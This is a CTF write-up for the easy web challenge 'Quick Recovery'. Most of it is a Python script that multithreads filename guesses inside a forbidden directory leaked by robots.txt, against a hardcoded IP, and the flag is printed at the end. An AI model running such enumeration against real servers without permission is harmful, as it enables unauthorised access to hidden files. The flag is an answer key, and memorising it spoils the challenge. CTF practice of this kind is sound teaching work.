---
title: "Quick Recovery"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: easy
points: 150
flag_format: "safctf{...}"
author: "safaricom-ctf-team"
---

# Quick Recovery

## Summary

- **Category:** web

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Quick Recovery — safctf

robots.txt leaks /IKnewYouWouldFindThis/ (403, listing disabled). The files
inside are still served directly, so a filename probe finds the flag.

    python3 solve.py
"""
import itertools
from concurrent.futures import ThreadPoolExecutor

import requests

requests.packages.urllib3.disable_warnings()

BASE = "http://54.72.82.22:8010"
DIR = "/IKnewYouWouldFindThis/"

NAMES = [
    "index", "records", "recovery", "record", "log", "logs", "access", "users",
    "user", "admin", "passwords", "password", "backup", "bak", "old", "notes",
    "note", "maintenance", "maint", "flag", "secret", "data", "db", "sql",
    "config", "conf", "readme", "list", "export", "dump", "archive", "history",
    "audit", "recover", "reset", "token", "tokens", "keys", "creds",
]
EXTS = ["", ".txt", ".html", ".htm", ".php", ".bak", ".old", ".json", ".log",
        ".md", ".sql", ".zip"]


def main() -> None:
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    candidates = [DIR + n + e for n, e in itertools.product(NAMES, EXTS)]

    def probe(path: str):
        try:
            r = session.get(BASE + path, timeout=8, allow_redirects=False)
        except requests.RequestException:
            return None
        if r.status_code == 200 and "safctf{" in r.text:
            return path, r.text.strip()
        return None

    with ThreadPoolExecutor(max_workers=24) as ex:
        for hit in ex.map(probe, candidates):
            if hit:
                print(f"{hit[0]} -> {hit[1]}")


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{69f779b5b18bad69606f1926395e7c2a}
```
